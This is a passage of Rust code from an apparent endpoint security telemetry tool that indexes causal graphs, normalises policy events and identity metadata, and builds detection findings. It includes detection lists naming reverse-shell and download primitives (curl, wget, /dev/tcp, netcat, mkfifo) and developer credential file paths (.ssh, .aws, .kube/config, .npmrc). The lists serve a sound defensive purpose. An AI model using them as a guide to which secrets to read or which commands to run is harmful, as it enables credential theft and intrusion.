    entries == endpoint_graph_node_index_entries(graph).as_slice()
}

fn endpoint_graph_node_index_entries(
    graph: &CausalGraph,
) -> Vec<EndpointFlightRecorderGraphNodeIndexEntry> {
    let mut attributes_by_node: BTreeMap<String, BTreeMap<String, serde_json::Value>> = graph
        .nodes
        .iter()
        .map(|(node_id, node)| (node_id.clone(), node.attributes.clone()))
        .collect();
    for edge in &graph.edges {
        for node_id in [&edge.from, &edge.to] {
            if let Some(attributes) = attributes_by_node.get_mut(node_id) {
                for (key, value) in &edge.attributes {
                    attributes
                        .entry(key.clone())
                        .or_insert_with(|| value.clone());
                }
            }
        }
    }

    graph
        .nodes
        .values()
        .map(|node| EndpointFlightRecorderGraphNodeIndexEntry {
            schema_version: ENDPOINT_FLIGHT_RECORDER_GRAPH_INDEX_SCHEMA_VERSION,
            node_id: node.node_id.clone(),
            kind: node.kind.clone(),
            label: node.label.clone(),
            first_seen: node.first_seen,
            last_seen: node.last_seen,
            attributes: attributes_by_node
                .remove(&node.node_id)
                .unwrap_or_else(|| node.attributes.clone()),
        })
        .collect()
}

fn read_endpoint_graph_node_index(
    index_path: &Path,
) -> Result<Vec<EndpointFlightRecorderGraphNodeIndexEntry>> {
    let contents = match fs::read_to_string(index_path) {
        Ok(contents) => contents,
        Err(err) if err.kind() == ErrorKind::NotFound => return Ok(Vec::new()),
        Err(err) => {
            return Err(err).with_context(|| {
                format!(
                    "read endpoint flight recorder graph index {}",
                    index_path.display()
                )
            })
        }
    };

    let mut entries = Vec::new();
    for (idx, line) in contents.lines().enumerate() {
        let trimmed = line.trim();
        if trimmed.is_empty() {
            continue;
        }
        let entry: EndpointFlightRecorderGraphNodeIndexEntry = serde_json::from_str(trimmed)
            .with_context(|| {
                format!(
                    "invalid endpoint flight recorder graph index JSONL at {}:{}",
                    index_path.display(),
                    idx + 1
                )
            })?;
        entries.push(entry);
    }
    Ok(entries)
}

fn replace_endpoint_graph_node_index(
    path: &Path,
    graph: &CausalGraph,
) -> Result<Vec<EndpointFlightRecorderGraphNodeIndexEntry>> {
    let entries = endpoint_graph_node_index_entries(graph);
    let index_path = endpoint_flight_recorder_graph_index_path(path);
    if let Some(parent) = index_path.parent() {
        if !parent.as_os_str().is_empty() {
            fs::create_dir_all(parent).with_context(|| {
                format!(
                    "create endpoint flight recorder graph index directory {}",
                    parent.display()
                )
            })?;
        }
    }
    let tmp_path = index_path.with_extension("jsonl.tmp");
    {
        let mut file = OpenOptions::new()
            .create(true)
            .truncate(true)
            .write(true)
            .open(&tmp_path)
            .with_context(|| {
                format!(
                    "open temporary endpoint flight recorder graph index {}",
                    tmp_path.display()
                )
            })?;
        for entry in &entries {
            serde_json::to_writer(&mut file, entry).with_context(|| {
                format!(
                    "serialize endpoint flight recorder graph index entry {}",
                    entry.node_id
                )
            })?;
            file.write_all(b"\n").with_context(|| {
                format!(
                    "write endpoint flight recorder graph index entry {} to {}",
                    entry.node_id,
                    tmp_path.display()
                )
            })?;
        }
        file.flush().with_context(|| {
            format!(
                "flush temporary endpoint flight recorder graph index {}",
                tmp_path.display()
            )
        })?;
    }
    fs::rename(&tmp_path, &index_path).with_context(|| {
        format!(
            "replace endpoint flight recorder graph index {} with {}",
            index_path.display(),
            tmp_path.display()
        )
    })?;
    Ok(entries)
}

fn endpoint_flight_recorder_graph_index_path(path: &Path) -> PathBuf {
    let file_name = path
        .file_name()
        .map(|name| name.to_string_lossy().into_owned())
        .unwrap_or_else(|| "flight-recorder.jsonl".to_string());
    path.with_file_name(format!("{file_name}.graph-index.jsonl"))
}

fn read_or_rebuild_endpoint_graph_edge_index(
    path: &Path,
    graph: &CausalGraph,
) -> Result<(PathBuf, Vec<EndpointFlightRecorderGraphEdgeIndexEntry>)> {
    let index_path = endpoint_flight_recorder_graph_edge_index_path(path);
    if let Ok(entries) = read_endpoint_graph_edge_index(&index_path) {
        if endpoint_graph_edge_index_covers_graph(&entries, graph) {
            return Ok((index_path, entries));
        }
    }

    let entries = replace_endpoint_graph_edge_index(path, graph)?;
    Ok((index_path, entries))
}

fn endpoint_graph_edge_index_covers_graph(
    entries: &[EndpointFlightRecorderGraphEdgeIndexEntry],
    graph: &CausalGraph,
) -> bool {
    if entries.iter().any(|entry| {
        entry.schema_version != ENDPOINT_FLIGHT_RECORDER_GRAPH_EDGE_INDEX_SCHEMA_VERSION
    }) {
        return false;
    }
    entries == endpoint_graph_edge_index_entries(graph).as_slice()
}

fn endpoint_graph_edge_index_entries(
    graph: &CausalGraph,
) -> Vec<EndpointFlightRecorderGraphEdgeIndexEntry> {
    graph
        .edges
        .iter()
        .map(|edge| EndpointFlightRecorderGraphEdgeIndexEntry {
            schema_version: ENDPOINT_FLIGHT_RECORDER_GRAPH_EDGE_INDEX_SCHEMA_VERSION,
            edge_id: edge.edge_id.clone(),
            from: edge.from.clone(),
            to: edge.to.clone(),
            kind: edge.kind.clone(),
            timestamp: edge.timestamp,
            observation_id: edge.observation_id.clone(),
            attributes: edge.attributes.clone(),
        })
        .collect()
}

fn read_endpoint_graph_edge_index(
    index_path: &Path,
) -> Result<Vec<EndpointFlightRecorderGraphEdgeIndexEntry>> {
    let contents = match fs::read_to_string(index_path) {
        Ok(contents) => contents,
        Err(err) if err.kind() == ErrorKind::NotFound => return Ok(Vec::new()),
        Err(err) => {
            return Err(err).with_context(|| {
                format!(
                    "read endpoint flight recorder graph edge index {}",
                    index_path.display()
                )
            })
        }
    };

    let mut entries = Vec::new();
    for (idx, line) in contents.lines().enumerate() {
        let trimmed = line.trim();
        if trimmed.is_empty() {
            continue;
        }
        let entry: EndpointFlightRecorderGraphEdgeIndexEntry = serde_json::from_str(trimmed)
            .with_context(|| {
                format!(
                    "invalid endpoint flight recorder graph edge index JSONL at {}:{}",
                    index_path.display(),
                    idx + 1
                )
            })?;
        entries.push(entry);
    }
    Ok(entries)
}

fn replace_endpoint_graph_edge_index(
    path: &Path,
    graph: &CausalGraph,
) -> Result<Vec<EndpointFlightRecorderGraphEdgeIndexEntry>> {
    let entries = endpoint_graph_edge_index_entries(graph);
    let index_path = endpoint_flight_recorder_graph_edge_index_path(path);
    if let Some(parent) = index_path.parent() {
        if !parent.as_os_str().is_empty() {
            fs::create_dir_all(parent).with_context(|| {
                format!(
                    "create endpoint flight recorder graph edge index directory {}",
                    parent.display()
                )
            })?;
        }
    }
    let tmp_path = index_path.with_extension("jsonl.tmp");
    {
        let mut file = OpenOptions::new()
            .create(true)
            .truncate(true)
            .write(true)
            .open(&tmp_path)
            .with_context(|| {
                format!(
                    "open temporary endpoint flight recorder graph edge index {}",
                    tmp_path.display()
                )
            })?;
        for entry in &entries {
            serde_json::to_writer(&mut file, entry).with_context(|| {
                format!(
                    "serialize endpoint flight recorder graph edge index entry {}",
                    entry.edge_id
                )
            })?;
            file.write_all(b"\n").with_context(|| {
                format!(
                    "write endpoint flight recorder graph edge index entry {} to {}",
                    entry.edge_id,
                    tmp_path.display()
                )
            })?;
        }
        file.flush().with_context(|| {
            format!(
                "flush temporary endpoint flight recorder graph edge index {}",
                tmp_path.display()
            )
        })?;
    }
    fs::rename(&tmp_path, &index_path).with_context(|| {
        format!(
            "replace endpoint flight recorder graph edge index {} with {}",
            index_path.display(),
            tmp_path.display()
        )
    })?;
    Ok(entries)
}

fn endpoint_flight_recorder_graph_edge_index_path(path: &Path) -> PathBuf {
    let file_name = path
        .file_name()
        .map(|name| name.to_string_lossy().into_owned())
        .unwrap_or_else(|| "flight-recorder.jsonl".to_string());
    path.with_file_name(format!("{file_name}.graph-edge-index.jsonl"))
}

fn observation_age_seconds(observation: &EndpointObservation, now: DateTime<Utc>) -> u64 {
    now.signed_duration_since(observation.timestamp)
        .num_seconds()
        .max(0) as u64
}

fn endpoint_event_from_policy_event(event: &PolicyEvent) -> EndpointEvent {
    match (&event.event_type, &event.data) {
        (
            PolicyEventType::FileRead | PolicyEventType::FileWrite,
            PolicyEventData::File(FileEventData {
                path,
                operation,
                content,
                ..
            }),
        ) => EndpointEvent::FileAccess {
            operation: FileOperation::from_policy_operation(
                operation.as_deref(),
                &event.event_type,
            ),
            path: path.clone(),
            source_url: None,
            content_preview: content.clone(),
        },
        (
            PolicyEventType::NetworkEgress,
            PolicyEventData::Network(NetworkEventData {
                host,
                port,
                protocol,
                url,
            }),
        ) => EndpointEvent::NetworkFlow {
            host: host.clone(),
            port: *port,
            protocol: protocol.clone(),
            url: url.clone(),
        },
        (PolicyEventType::CommandExec, PolicyEventData::Command(command)) => {
            EndpointEvent::ProcessExec {
                image: command.command.clone(),
                args: command.args.clone(),
                env: BTreeMap::new(),
            }
        }
        (PolicyEventType::ToolCall, PolicyEventData::Tool(tool)) => EndpointEvent::ToolCall {
            tool_name: tool.tool_name.clone(),
            parameters: tool.parameters.clone(),
        },
        (PolicyEventType::SecretAccess, PolicyEventData::Secret(secret)) => {
            EndpointEvent::CredentialAccess {
                kind: credential_kind_from_secret(&secret.scope, &secret.secret_name),
                path: None,
                name: Some(secret.secret_name.clone()),
            }
        }
        (PolicyEventType::Custom, PolicyEventData::Custom(custom)) => {
            endpoint_event_from_custom_policy_event(custom).unwrap_or_else(|| {
                EndpointEvent::Other {
                    category: custom.custom_type.clone(),
                    fields: custom.extra.clone().into_iter().collect(),
                }
            })
        }
        _ => EndpointEvent::Other {
            category: event.event_type.as_str().to_string(),
            fields: BTreeMap::new(),
        },
    }
}

fn endpoint_event_from_custom_policy_event(custom: &CustomEventData) -> Option<EndpointEvent> {
    custom
        .extra
        .get("endpointEvent")
        .and_then(|value| serde_json::from_value(value.clone()).ok())
}

fn metadata_as_btree(
    metadata: Option<&serde_json::Value>,
    context: Option<&serde_json::Value>,
) -> BTreeMap<String, serde_json::Value> {
    let mut out = metadata
        .and_then(serde_json::Value::as_object)
        .map(|obj| {
            obj.iter()
                .map(|(key, value)| (key.clone(), value.clone()))
                .collect::<BTreeMap<_, _>>()
        })
        .unwrap_or_default();

    promote_policy_event_context_identity(&mut out, context);
    out
}

fn promote_policy_event_context_identity(
    metadata: &mut BTreeMap<String, serde_json::Value>,
    context: Option<&serde_json::Value>,
) {
    let Some(context) = context else {
        return;
    };
    promote_context_string(
        metadata,
        context,
        "hostId",
        &[
            "hostId",
            "host_id",
            "endpointHostId",
            "endpoint_host_id",
            "endpointId",
            "endpoint_id",
        ],
    );
    promote_context_string(
        metadata,
        context,
        "userId",
        &[
            "userId",
            "user_id",
            "principal",
            "principalId",
            "principal_id",
        ],
    );
    promote_context_string(metadata, context, "sessionId", &["sessionId", "session_id"]);
    promote_context_string(
        metadata,
        context,
        "agentId",
        &[
            "agentId",
            "agent_id",
            "endpointAgentId",
            "endpoint_agent_id",
            "runtimeAgentId",
            "runtime_agent_id",
        ],
    );
    promote_context_string(
        metadata,
        context,
        "workloadId",
        &[
            "workloadId",
            "workload_id",
            "workloadIdentity",
            "workload_identity",
            "spiffeId",
            "spiffe_id",
        ],
    );
    promote_context_string(
        metadata,
        context,
        "approvalId",
        &[
            "approvalId",
            "approval_id",
            "approvalRequestId",
            "approval_request_id",
        ],
    );
    promote_context_string(
        metadata,
        context,
        "posture",
        &["posture", "postureState", "posture_state"],
    );
    promote_context_scalar(
        metadata,
        context,
        "policyEpoch",
        &["policyEpoch", "policy_epoch", "policyBundleEpoch"],
    );
    promote_context_string(
        metadata,
        context,
        "policyVersion",
        &["policyVersion", "policy_version"],
    );
    promote_context_string(
        metadata,
        context,
        "policyHash",
        &["policyHash", "policy_hash"],
    );

    if !metadata.contains_key("userId") {
        for path in [
            &["identity", "id"][..],
            &["session", "identity", "id"][..],
            &["metadata", "identity", "id"][..],
        ] {
            if let Some(value) = string_at_path(context, path) {
                metadata.insert("userId".to_string(), serde_json::Value::String(value));
                break;
            }
        }
    }
    if !metadata.contains_key("sessionId") {
        for path in [
            &["session", "sessionId"][..],
            &["session", "session_id"][..],
            &["metadata", "sessionId"][..],
            &["metadata", "session_id"][..],
        ] {
            if let Some(value) = string_at_path(context, path) {
                metadata.insert("sessionId".to_string(), serde_json::Value::String(value));
                break;
            }
        }
    }
}

fn promote_context_string(
    metadata: &mut BTreeMap<String, serde_json::Value>,
    context: &serde_json::Value,
    canonical_key: &str,
    aliases: &[&str],
) {
    if metadata_contains_any_key(metadata, canonical_key, aliases) {
        return;
    }
    if let Some(value) = context_string_value(context, aliases) {
        metadata.insert(canonical_key.to_string(), serde_json::Value::String(value));
    }
}

fn promote_context_scalar(
    metadata: &mut BTreeMap<String, serde_json::Value>,
    context: &serde_json::Value,
    canonical_key: &str,
    aliases: &[&str],
) {
    if metadata_contains_any_key(metadata, canonical_key, aliases) {
        return;
    }
    if let Some(value) = context_scalar_value(context, aliases) {
        metadata.insert(canonical_key.to_string(), value);
    }
}

fn metadata_contains_any_key(
    metadata: &BTreeMap<String, serde_json::Value>,
    canonical_key: &str,
    aliases: &[&str],
) -> bool {
    metadata.contains_key(canonical_key)
        || aliases.iter().any(|alias| metadata.contains_key(*alias))
}

fn context_string_value(context: &serde_json::Value, aliases: &[&str]) -> Option<String> {
    aliases.iter().find_map(|alias| {
        string_at_path(context, &[*alias])
            .or_else(|| string_at_path(context, &["metadata", *alias]))
    })
}

fn context_scalar_value(
    context: &serde_json::Value,
    aliases: &[&str],
) -> Option<serde_json::Value> {
    aliases.iter().find_map(|alias| {
        scalar_at_path(context, &[*alias])
            .or_else(|| scalar_at_path(context, &["metadata", *alias]))
    })
}

fn string_at_path(value: &serde_json::Value, path: &[&str]) -> Option<String> {
    path.iter()
        .try_fold(value, |current, key| current.get(*key))
        .and_then(serde_json::Value::as_str)
        .map(str::trim)
        .filter(|value| !value.is_empty())
        .map(ToString::to_string)
}

fn scalar_at_path(value: &serde_json::Value, path: &[&str]) -> Option<serde_json::Value> {
    let value = path
        .iter()
        .try_fold(value, |current, key| current.get(*key))?;
    match value {
        serde_json::Value::String(text) if !text.trim().is_empty() => {
            Some(serde_json::Value::String(text.trim().to_string()))
        }
        serde_json::Value::Number(_) | serde_json::Value::Bool(_) => Some(value.clone()),
        _ => None,
    }
}

fn process_from_metadata(metadata: &BTreeMap<String, serde_json::Value>) -> EndpointProcess {
    let process_obj = metadata
        .get("process")
        .and_then(serde_json::Value::as_object);
    EndpointProcess {
        pid: u32_field(metadata, process_obj, &["pid", "processId", "process_id"]),
        ppid: u32_field(metadata, process_obj, &["ppid", "parentPid", "parent_pid"]),
        process_guid: string_field_nested(
            metadata,
            process_obj,
            &["processGuid", "process_guid", "entityId", "entity_id"],
        ),
        parent_process_guid: string_field_nested(
            metadata,
            process_obj,
            &["parentProcessGuid", "parent_process_guid", "parentEntityId"],
        ),
        image: string_field_nested(metadata, process_obj, &["image", "processImage", "path"]),
        command_line: string_field_nested(
            metadata,
            process_obj,
            &["commandLine", "command_line", "cmdline"],
        ),
        cwd: string_field_nested(metadata, process_obj, &["cwd", "workingDirectory"]),
        signing: metadata
            .get("signing")
            .or_else(|| process_obj.and_then(|obj| obj.get("signing")))
            .and_then(|value| serde_json::from_value(value.clone()).ok())
            .unwrap_or_default(),
    }
}

fn u32_field(
    metadata: &BTreeMap<String, serde_json::Value>,
    nested: Option<&serde_json::Map<String, serde_json::Value>>,
    keys: &[&str],
) -> Option<u32> {
    for key in keys {
        let value = nested
            .and_then(|obj| obj.get(*key))
            .or_else(|| metadata.get(*key));
        match value {
            Some(serde_json::Value::Number(number)) => {
                if let Some(value) = number.as_u64().and_then(|value| u32::try_from(value).ok()) {
                    return Some(value);
                }
            }
            Some(serde_json::Value::String(value)) => {
                if let Ok(parsed) = value.parse::<u32>() {
                    return Some(parsed);
                }
            }
            _ => {}
        }
    }
    None
}

fn string_field(metadata: &BTreeMap<String, serde_json::Value>, keys: &[&str]) -> Option<String> {
    keys.iter().find_map(|key| {
        metadata
            .get(*key)
            .and_then(serde_json::Value::as_str)
            .map(str::trim)
            .filter(|value| !value.is_empty())
            .map(ToString::to_string)
    })
}

fn normalized_identity_value(value: Option<&str>) -> Option<String> {
    value
        .map(str::trim)
        .filter(|value| !value.is_empty())
        .map(ToString::to_string)
}

fn agent_id_field(metadata: &BTreeMap<String, serde_json::Value>) -> Option<String> {
    string_field(
        metadata,
        &[
            "agentId",
            "agent_id",
            "endpointAgentId",
            "endpoint_agent_id",
            "runtimeAgentId",
            "runtime_agent_id",
        ],
    )
}

fn workload_id_field(metadata: &BTreeMap<String, serde_json::Value>) -> Option<String> {
    string_field(
        metadata,
        &[
            "workloadId",
            "workload_id",
            "workloadIdentity",
            "workload_identity",
            "spiffeId",
            "spiffe_id",
        ],
    )
}

fn approval_id_field(metadata: &BTreeMap<String, serde_json::Value>) -> Option<String> {
    string_field(
        metadata,
        &[
            "approvalId",
            "approval_id",
            "approvalRequestId",
            "approval_request_id",
        ],
    )
}

fn tool_name_field(observation: &EndpointObservation) -> Option<String> {
    match &observation.event {
        EndpointEvent::ToolCall { tool_name, .. } => normalized_identity_value(Some(tool_name))
            .or_else(|| tool_name_metadata_field(&observation.metadata)),
        _ => tool_name_metadata_field(&observation.metadata),
    }
}

fn tool_name_metadata_field(metadata: &BTreeMap<String, serde_json::Value>) -> Option<String> {
    string_field(
        metadata,
        &[
            "toolName",
            "tool_name",
            "mcpToolName",
            "mcp_tool_name",
            "toolInvocationName",
            "tool_invocation_name",
        ],
    )
}

fn tool_call_id_field(metadata: &BTreeMap<String, serde_json::Value>) -> Option<String> {
    string_field(
        metadata,
        &[
            "toolCallId",
            "tool_call_id",
            "toolInvocationId",
            "tool_invocation_id",
            "toolUseId",
            "tool_use_id",
        ],
    )
}

fn credential_kind_field(observation: &EndpointObservation) -> Option<String> {
    match &observation.event {
        EndpointEvent::CredentialAccess { kind, .. } => {
            normalized_identity_value(Some(kind.as_str()))
                .or_else(|| credential_kind_metadata_field(&observation.metadata))
        }
        _ => credential_kind_metadata_field(&observation.metadata),
    }
}

fn credential_kind_metadata_field(
    metadata: &BTreeMap<String, serde_json::Value>,
) -> Option<String> {
    string_field(
        metadata,
        &[
            "credentialKind",
            "credential_kind",
            "secretKind",
            "secret_kind",
            "credentialScope",
            "credential_scope",
        ],
    )
}

fn event_target_field(observation: &EndpointObservation) -> Option<String> {
    let event_target = match &observation.event {
        EndpointEvent::ProcessExec { image, .. } => normalized_identity_value(Some(image)),
        EndpointEvent::FileAccess { path, .. }
        | EndpointEvent::DylibLoad { path, .. }
        | EndpointEvent::LaunchPersistence { path, .. } => normalized_identity_value(Some(path)),
        EndpointEvent::NetworkFlow { host, .. } => normalized_identity_value(Some(host)),
        EndpointEvent::DnsLookup { query, .. } => normalized_identity_value(Some(query)),
        EndpointEvent::PackageScript {
            manager, package, ..
        } => normalized_identity_value(package.as_deref().or(Some(manager.as_str()))),
        EndpointEvent::BrowserExtensionInstall {
            extension_id, path, ..
        } => normalized_identity_value(extension_id.as_deref().or(Some(path))),
        EndpointEvent::BrowserDownload {
            source_url, path, ..
        } => normalized_identity_value(source_url.as_deref().or(Some(path))),
        EndpointEvent::CredentialAccess { kind, path, name } => {
            normalized_identity_value(name.as_deref().or(path.as_deref()).or(Some(kind.as_str())))
        }
        EndpointEvent::ToolCall { tool_name, .. } => normalized_identity_value(Some(tool_name)),
        EndpointEvent::PolicyDecision { target, .. } => {
            normalized_identity_value(target.as_deref())
        }
        EndpointEvent::Other { category, .. } => normalized_identity_value(Some(category)),
    };
    event_target.or_else(|| event_target_metadata_field(&observation.metadata))
}

fn event_target_metadata_field(metadata: &BTreeMap<String, serde_json::Value>) -> Option<String> {
    string_field(
        metadata,
        &[
            "eventTarget",
            "event_target",
            "target",
            "resourceTarget",
            "resource_target",
        ],
    )
}

fn event_target_hash_field(event_target: Option<&str>) -> Option<String> {
    normalized_identity_value(event_target)
        .map(|event_target| sha256(event_target.as_bytes()).to_hex_prefixed())
}

fn process_image_hash_field(observation: &EndpointObservation) -> Option<String> {
    normalized_identity_value(observation.process.image.as_deref())
        .map(|image| sha256(image.as_bytes()).to_hex_prefixed())
}

fn process_command_line_hash_field(observation: &EndpointObservation) -> Option<String> {
    normalized_identity_value(observation.process.command_line.as_deref())
        .map(|command_line| sha256(command_line.as_bytes()).to_hex_prefixed())
}

fn string_field_nested(
    metadata: &BTreeMap<String, serde_json::Value>,
    nested: Option<&serde_json::Map<String, serde_json::Value>>,
    keys: &[&str],
) -> Option<String> {
    keys.iter().find_map(|key| {
        nested
            .and_then(|obj| obj.get(*key))
            .or_else(|| metadata.get(*key))
            .and_then(serde_json::Value::as_str)
            .map(str::trim)
            .filter(|value| !value.is_empty())
            .map(ToString::to_string)
    })
}

struct FindingRule<'a> {
    rule_id: &'a str,
    title: &'a str,
    severity: DetectionSeverity,
    confidence: f32,
    description: &'a str,
    mitre_attack: Vec<&'a str>,
    tags: Vec<&'a str>,
    remediation: &'a str,
}

fn finding(
    observation: &EndpointObservation,
    evidence: Vec<DetectionEvidence>,
    rule: FindingRule<'_>,
) -> DetectionFinding {
    DetectionFinding {
        finding_id: stable_id(
            "finding",
            [rule.rule_id, observation.observation_id.as_str()],
        ),
        rule_id: rule.rule_id.to_string(),
        title: rule.title.to_string(),
        severity: rule.severity,
        confidence: rule.confidence,
        description: rule.description.to_string(),
        observation_id: observation.observation_id.clone(),
        timestamp: observation.timestamp,
        evidence,
        mitre_attack: rule
            .mitre_attack
            .into_iter()
            .map(ToString::to_string)
            .collect(),
        tags: rule.tags.into_iter().map(ToString::to_string).collect(),
        remediation: rule.remediation.to_string(),
    }
}

fn ev(key: impl Into<String>, value: impl Into<String>) -> DetectionEvidence {
    DetectionEvidence {
        key: key.into(),
        value: value.into(),
    }
}

fn opt_ev(key: impl Into<String>, value: Option<&str>) -> Option<DetectionEvidence> {
    value.map(|value| ev(key, value))
}

fn is_install_phase(phase: &str) -> bool {
    let phase = phase.to_ascii_lowercase();
    [
        "preinstall",
        "install",
        "postinstall",
        "prepare",
        "build",
        "build.rs",
        "setup.py",
    ]
    .iter()
    .any(|needle| phase.contains(needle))
}

fn suspicious_script_reason(script: &str) -> Option<&'static str> {
    let script = script.to_ascii_lowercase();
    [
        ("curl ", "downloads remote payloads with curl"),
        ("wget ", "downloads remote payloads with wget"),
        ("bash -c", "executes an inline shell"),
        ("sh -c", "executes an inline shell"),
        ("base64", "decodes or hides payload material"),
        ("openssl enc", "decrypts embedded payload material"),
        ("osascript", "uses AppleScript automation"),
        ("launchctl", "modifies launch services"),
        ("crontab", "modifies cron persistence"),
        ("chmod +x", "makes a downloaded file executable"),
        ("mkfifo", "creates shell transport primitives"),
        ("/dev/tcp", "uses shell TCP redirection"),
        ("nc ", "uses netcat"),
        ("netcat", "uses netcat"),
        ("eval ", "evaluates generated code"),
        ("python -c", "executes inline Python"),
        ("ruby -e", "executes inline Ruby"),
        ("perl -e", "executes inline Perl"),
    ]
    .into_iter()
    .find_map(|(needle, reason)| script.contains(needle).then_some(reason))
}

fn path_is_user_writable_or_download(path: &str) -> bool {
    let path = normalize_path_string(path);
    path.starts_with("/tmp/")
        || path.starts_with("/private/tmp/")
        || path.starts_with("/var/folders/")
        || path.contains("/Downloads/")
        || path.contains("/Library/Caches/")
        || path.contains("/.cache/")
        || path.contains("/node_modules/.bin/")
        || path.contains("/target/debug/")
        || path.contains("/target/release/")
}

fn path_is_launch_persistence(path: &str) -> bool {
    let path = normalize_path_string(path);
    path.contains("/Library/LaunchAgents/")
        || path.contains("/Library/LaunchDaemons/")
        || path.contains("/System/Library/LaunchAgents/")
        || path.contains("/System/Library/LaunchDaemons/")
}

fn path_looks_like_browser_extension(path: &str) -> bool {
    let path = normalize_path_string(path);
    path.contains("/Extensions/") || path.contains("/Browser Extensions/")
}

fn path_looks_like_developer_secret(path: &str) -> bool {
    let path = normalize_path_string(path).to_ascii_lowercase();
    [
        "/.ssh/",
        "/.aws/",
        "/.config/gcloud/",
        "/.config/gh/hosts.yml",
        "/.config/gh/config.yml",
        "/.config/glab-cli/hosts.yml",
        "/.config/glab-cli/config.yml",
        "/.config/hub",
        "/.config/git-credential/",
        "/.config/sops/age/keys.txt",
        "/.age/key.txt",
        "/.gnupg/private-keys-v1.d/",
        "/.gnupg/secring.gpg",
        "/.kube/config",
        "/.terraform.d/credentials.tfrc.json",
        "/.terraformrc",
        "/.config/pulumi/credentials.json",
        "/.pulumi/credentials.json",
        "/.azure/",
        "/.npmrc",
        "/.pypirc",
        "/.yarnrc.yml",
        "/.pnpmrc",
        "/.config/pip/pip.conf",
        "/.pip/pip.conf",
        "/pip/pip.ini",
        "/.config/pypoetry/auth.toml",
        "/library/application support/pypoetry/auth.toml",
        "/.m2/settings.xml",
        "/.gradle/gradle.properties",
        "/.nuget/nuget/nuget.config",
        "/.cargo/credentials",
        "/.docker/config.json",
        "id_rsa",
        "id_ed25519",
        "cookies",
        "local state",
    ]
    .iter()
    .any(|needle| path.contains(needle))
}

fn credential_kind_is_developer_secret(kind: &CredentialKind) -> bool {
    matches!(
        kind,
        CredentialKind::SshKey
            | CredentialKind::ApiToken
            | CredentialKind::CloudCredential
            | CredentialKind::PackageRegistryToken
            | CredentialKind::SigningKey
    )
}

fn credential_kind_from_secret(scope: &str, secret_name: &str) -> CredentialKind {
    let scope = scope.trim();
    let combined = format!("{scope} {secret_name}").to_ascii_lowercase();
    if contains_any(&combined, &["ssh", "private_key", "id_rsa", "id_ed25519"]) {
        CredentialKind::SshKey
    } else if contains_any(
        &combined,
        &["npm", "pypi", "cargo", "registry", "package_token"],
    ) {
        CredentialKind::PackageRegistryToken
    } else if contains_any(&combined, &["aws", "gcp", "gcloud", "azure", "cloud"]) {
        CredentialKind::CloudCredential
    } else if contains_any(&combined, &["browser", "cookie"]) {
        CredentialKind::BrowserCookie
    } else if contains_any(
        &combined,
        &[
            "signing",
            "codesign",
            "notary",
            "certificate",
            "cert",
            "sops",
            "age",
            "gnupg",
            "gpg",
        ],
    ) {
        CredentialKind::SigningKey
    } else if contains_any(
        &combined,
        &[
            "api",
            "token",
            "secret",
            "key",
            "pat",
            "github_token",
            "gitlab_token",
            "ci",
        ],
    ) {
        CredentialKind::ApiToken
    } else {
        CredentialKind::Other(scope.to_string())
    }
}

fn contains_any(value: &str, needles: &[&str]) -> bool {
    needles.iter().any(|needle| value.contains(needle))
}

fn project_observation_privacy(
    observation: &EndpointObservation,
    privacy_mode: &EndpointTelemetryPrivacyMode,
) -> EndpointTelemetryObservationProjection {
    let mut projections = Vec::new();
    push_optional_hash(
        &mut projections,
        "hostId",
        observation.host_id.as_deref(),
        privacy_mode,
        "host identifiers are correlated by hash by default",
    );
    push_optional_hash(
        &mut projections,
        "userId",
        observation.user_id.as_deref(),
        privacy_mode,
        "user identifiers are correlated by hash by default",
    );
    push_optional_hash(
        &mut projections,
        "sessionId",
        observation.session_id.as_deref(),
        privacy_mode,
        "session identifiers are correlated by hash by default",
    );
    push_optional_hash(
        &mut projections,
        "process.image",
        observation.process.image.as_deref(),
        privacy_mode,
        "process paths may include local usernames or project names",
    );
    push_optional_local(
        &mut projections,
        "process.commandLine",
        observation.process.command_line.as_deref(),
        privacy_mode,
        "command lines may contain secrets, prompts, paths, or customer data",
    );
    push_optional_hash(
        &mut projections,
        "process.cwd",
        observation.process.cwd.as_deref(),
        privacy_mode,
        "working directories may include local usernames or repository names",
    );
    push_optional_hash(
        &mut projections,
        "process.processGuid",
        observation.process.process_guid.as_deref(),
        privacy_mode,
        "process identifiers are correlated by hash by default",
    );
    push_optional_hash(
        &mut projections,
        "process.parentProcessGuid",
        observation.process.parent_process_guid.as_deref(),
        privacy_mode,
        "parent process identifiers are correlated by hash by default",
    );
    push_optional_metadata(
        &mut projections,
        "process.pid",
        observation.process.pid.map(|value| value.to_string()),
        privacy_mode,
        "numeric process identifiers are low-content local features",
    );
    push_optional_metadata(
        &mut projections,
        "process.ppid",
        observation.process.ppid.map(|value| value.to_string()),
        privacy_mode,
        "numeric parent process identifiers are low-content local features",
    );
    push_metadata(
        &mut projections,
        "process.signing.trust",
        format!("{:?}", observation.process.signing.trust),
        privacy_mode,
        "signature trust is a normalized posture feature",
    );
    push_optional_metadata(
        &mut projections,
        "process.signing.notarized",
        observation
            .process
            .signing
            .notarized
            .map(|value| value.to_string()),
        privacy_mode,
        "notarization state is a normalized posture feature",
    );
    push_optional_hash(
        &mut projections,
        "process.signing.cdhash",
        observation.process.signing.cdhash.as_deref(),
        privacy_mode,
        "code directory hashes are correlated by hash by default",
    );
    push_optional_hash(
        &mut projections,
        "process.signing.expectedCdhash",
        observation.process.signing.expected_cdhash.as_deref(),
        privacy_mode,
        "expected code directory hashes are correlated by hash by default",
    );

    project_event_privacy(&observation.event, privacy_mode, &mut projections);
    if !observation.metadata.is_empty() {
        push_local(
            &mut projections,
            "metadata",
            serde_json::to_string(&observation.metadata).unwrap_or_default(),
            privacy_mode,
            "arbitrary observation metadata may contain raw artifact or tenant data",
        );
    }

    let raw_suppressed_count = projections
        .iter()
        .filter(|projection| {
            projection.raw_value.is_none()
                && projection.value_hash.is_some()
                && matches!(
                    projection.redaction_class,
                    EndpointEvidenceRedactionClass::HashOnly
                        | EndpointEvidenceRedactionClass::LocalOnly
                        | EndpointEvidenceRedactionClass::Redacted
                )
        })
        .count();
    let local_only_count = projections
        .iter()
        .filter(|projection| {
            projection.redaction_class == EndpointEvidenceRedactionClass::LocalOnly
        })
        .count();

    EndpointTelemetryObservationProjection {
        observation_id: observation.observation_id.clone(),
        event_kind: observation.event.kind_name().to_string(),
        field_count: projections.len(),
        raw_suppressed_count,
        local_only_count,
        projections,
    }
}

fn project_event_privacy(
    event: &EndpointEvent,
    privacy_mode: &EndpointTelemetryPrivacyMode,
    projections: &mut Vec<EndpointTelemetryFieldProjection>,
) {
    match event {
        EndpointEvent::ProcessExec { image, args, env } => {
            push_hash(
                projections,
                "event.processExec.image",
